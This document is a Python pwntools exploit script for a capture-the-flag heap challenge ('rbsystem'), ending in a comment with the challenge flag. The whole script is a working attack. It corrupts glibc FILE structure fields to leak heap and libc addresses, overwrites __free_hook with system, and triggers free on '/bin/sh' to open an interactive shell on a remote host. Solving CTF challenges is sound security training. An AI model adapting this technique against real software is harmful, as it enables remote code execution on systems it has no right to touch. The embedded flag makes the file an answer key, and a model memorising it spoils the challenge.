#!/usr/bin/env python3
from pwn import *


def prompt(tube, choice, wait):
    if wait:
        tube.recvuntil(b'Your choice: ')
    tube.sendline(str(choice))


def allocate(tube, index, size, wait):
    prompt(tube, 1, wait)
    if wait:
        tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    if wait:
        tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def edit(tube, index, offset, size, wait):
    prompt(tube, 2, wait)
    if wait:
        tube.recvuntil(b'Index: ')
    tube.sendline(str(index))
    if wait:
        tube.recvuntil(b'Offset: ')
    tube.sendline(str(offset))
    if wait:
        tube.recvuntil(b'Size: ')
    tube.sendline(str(size))


def show0(tube, index, wait):
    prompt(tube, 3, wait)
    if wait:
        tube.recvuntil(b'Index: ')
    tube.sendline(str(index))


def show1(tube):
    tube.recvuntil(b'Content: ')
    suffix = b'\n1. allocate\n'
    data = tube.recvuntil(suffix)
    return data[:-len(suffix)]


def show(tube, index, wait):
    show0(tube, index, wait)
    return show1(tube)


def open_file(tube, wait):
    prompt(tube, 4, wait)


def close_file(tube, wait):
    prompt(tube, 5, wait)


ATTACKER_INDEX = 15
FILE_ADDR_EXAMPLE = 0x558216da5350
READ_BASE_EXAMPLE = 0x558216da6590
ATTACKER_ADDR_EXAMPLE = 0x558216da5580
OFFSETOF_IO_READ_PTR = 8
OFFSETOF_IO_READ_END = 16
OFFSETOF_IO_READ_BASE = 24
OFFSETOF_IO_BUF_BASE = 56
OFFSETOF_IO_BUF_END = 64
OFFSETOF_CHAIN = 104
OFFSETOF_FILENO = 112
FLAGS = 0xfbad2488
IO_READ_PTR_EXAMPLE = 0x55a142446398
IO_READ_END_EXAMPLE = 0x55a142448590
SIZEOF_FILE = 0x228


def setup_heap(tube, wait):
    """Heap layout: | 4k x 15 | FILE | 4k | _IO_read_base (4k) |"""
    for i in range(ATTACKER_INDEX):
        allocate(tube, i, 0x1000, wait)
    open_file(tube, wait)
    allocate(tube, ATTACKER_INDEX, 0x1000, wait)


def overwrite_file_field(tube, field_offset, size, wait):
    edit(tube, ATTACKER_INDEX, field_offset - (ATTACKER_ADDR_EXAMPLE - FILE_ADDR_EXAMPLE), size, wait)


def leak_qword(tube, wait):
    edit(tube, ATTACKER_INDEX, 0, 8, wait)
    qword, = struct.unpack('<Q', show(tube, ATTACKER_INDEX, wait)[:8].ljust(8, b'\x00'))
    return qword


def skip_until_file(tube):
    chunk_size = 16
    n_chunks = (0x10000 - SIZEOF_FILE) // chunk_size
    for _ in range(n_chunks):
        edit(tube, ATTACKER_INDEX, 0, chunk_size, wait=False)
        show0(tube, ATTACKER_INDEX, wait=False)
    for i in range(n_chunks):
        dword, = struct.unpack('<I', show1(tube)[:4].ljust(4, b'\x00'))
        if dword == FLAGS:
            for _ in range(n_chunks - i - 1):
                show1(tube)
            return i * chunk_size
    assert False, 'Could not find FILE'


def skip_n(tube, n, wait):
    while n > 0x1000:
        edit(tube, ATTACKER_INDEX, 0, 0x1000, wait)
        n -= 0x1000
    edit(tube, ATTACKER_INDEX, 0, n, wait)


def overwrite_file_field_with(tube, field_offset, value, wait):
    overwrite_file_field(tube, field_offset, len(value), wait)
    tube.send(value)


def main():
    if args.HOST and args.PORT:
        tube = remote(args.HOST, int(args.PORT))
    else:
        tube = gdb.debug(['./rbsystem'], gdbscript=r'''
set logging overwrite on
set pagination off
set logging on
set breakpoint pending on
b malloc
commands
  python n = int(str(gdb.parse_and_eval('$rdi'))); gdb.execute('finish'); print('malloc(0x{:x}) = 0x{:x}'.format(n, int(str(gdb.parse_and_eval('$rax'))))); gdb.execute('c')
end
catch syscall exit
catch syscall exit_group
catch syscall execve
b system
c
''')
    setup_heap(tube, wait=False)
    print('[*] _IO_read_end = a very large value; this allows infinite reading from the heap')
    overwrite_file_field(tube, OFFSETOF_IO_READ_END, 8, wait=False)
    print('[*] skip urandom data and a bit more, so that _IO_read_ptr points to all 0s')
    skip_n(tube, 0x2000, wait=False)
    print('[*] rewind; now we are somewhere before FILE')
    overwrite_file_field(tube, OFFSETOF_IO_READ_PTR, 2, wait=False)
    print('[*] align to 16-byte boundary')
    skip_n(tube, 14, wait=False)
    print('[*] probe using 16-byte increments until we find a FILE signature')
    file_offset = 16 + skip_until_file(tube)
    print(f'[+] file_offset   = 0x{file_offset:016x}')
    print('[*] _IO_read_ptr most likely points to all 0s, so rewind; now we are at a known offset before FILE')
    overwrite_file_field(tube, OFFSETOF_IO_READ_PTR, 2, wait=True)
    print('[*] position on _IO_read_base')
    skip_n(tube, -2 + file_offset + OFFSETOF_IO_READ_BASE, wait=True)
    print('[*] leak _IO_read_base')
    read_base = leak_qword(tube, wait=True)
    print(f'[+] read_base     = 0x{read_base:016x}')
    attacker_addr = read_base - (READ_BASE_EXAMPLE - ATTACKER_ADDR_EXAMPLE)
    print(f'[+] attacker_addr = 0x{attacker_addr:016x}')
    print('[*] position on _chain')
    skip_n(tube, OFFSETOF_CHAIN - OFFSETOF_IO_READ_BASE - 8, wait=True)
    print('[*] _chain points to _IO_2_1_stderr_; leak its address')
    stderr = leak_qword(tube, wait=True)
    print(f'[+] stderr        = 0x{stderr:016x}')
    libc = stderr - 0x3ec680
    print(f'[+] libc          = 0x{libc:016x}')
    assert libc & 0xfff == 0
    stdin = libc + 0x3eba00
    print(f'[+] stdin         = 0x{stdin:016x}')
    free_hook = libc + 0x3ed8e8
    print(f'[+] free_hook     = 0x{free_hook:016x}')
    system = libc + 0x4f440
    print(f'[+] system        = 0x{system:016x}')
    print('[*] move _IO_read_ptr from _fileno to _flags2, which is known to be 0')
    skip_n(tube, 4, wait=True)
    print('[*] _fileno = 0 (STDIN_FILENO)')
    overwrite_file_field(tube, OFFSETOF_FILENO, 4, wait=True)
    print('[*] rewind; now we are at a know offset before FILE')
    overwrite_file_field(tube, OFFSETOF_IO_READ_PTR, 2, wait=True)
    print('[*] position on _IO_buf_end')
    skip_n(tube, file_offset - 2 + OFFSETOF_IO_BUF_END, wait=True)
    print('[*] repair _IO_read_end')
    overwrite_file_field(tube, OFFSETOF_IO_READ_END, 8, wait=True)
    print('[*] repair _IO_read_ptr; now FILE acts like stdin')
    skip_n(tube, IO_READ_END_EXAMPLE - IO_READ_PTR_EXAMPLE, wait=True)
    print('[*] put /bin/sh at the beginning of the attacker chunk')
    edit(tube, ATTACKER_INDEX, 0, 8, wait=True)
    tube.send(b'/bin/sh\0')
    print('[*] _IO_buf_end = free_hook + 32 (by itself does nothing)')
    overwrite_file_field_with(tube, OFFSETOF_IO_BUF_END, struct.pack('<Q', free_hook + 32), wait=True)
    print('[*] _IO_buf_base = free_hook (next edit will write there)')
    overwrite_file_field_with(tube, OFFSETOF_IO_BUF_BASE, struct.pack('<Q', free_hook), wait=True)
    print('[*] offset does not matter, so use 8 in order to avoid overwriting /bin/sh')
    edit(tube, ATTACKER_INDEX, 8, 8, wait=True)
    print('[*] one_gadgets don\'t work, since their constraints are not satisfied, so overwrite free_hook with system')
    print('[*] we won\'t have a chance to send anything to stdin again, because new data would overwrite free_hook, therefore send everything at once')
    tube.send(struct.pack('<QQI', system, attacker_addr, 3))
    print('[*] _IO_buf_base = attacker_addr ("/bin/sh")')
    overwrite_file_field(tube, OFFSETOF_IO_BUF_BASE, 8, wait=True)
    print('[*] _fileno = 3; avoid closing stdin')
    overwrite_file_field(tube, OFFSETOF_FILENO, 4, wait=True)
    print('[*] trigger free(_IO_buf_base)')
    close_file(tube, wait=True)
    print('[+] enjoy the shell')
    tube.interactive()


if __name__ == '__main__':
    main()

# flag{9d90e1dedc9412f32f9a94c6eb761beb}
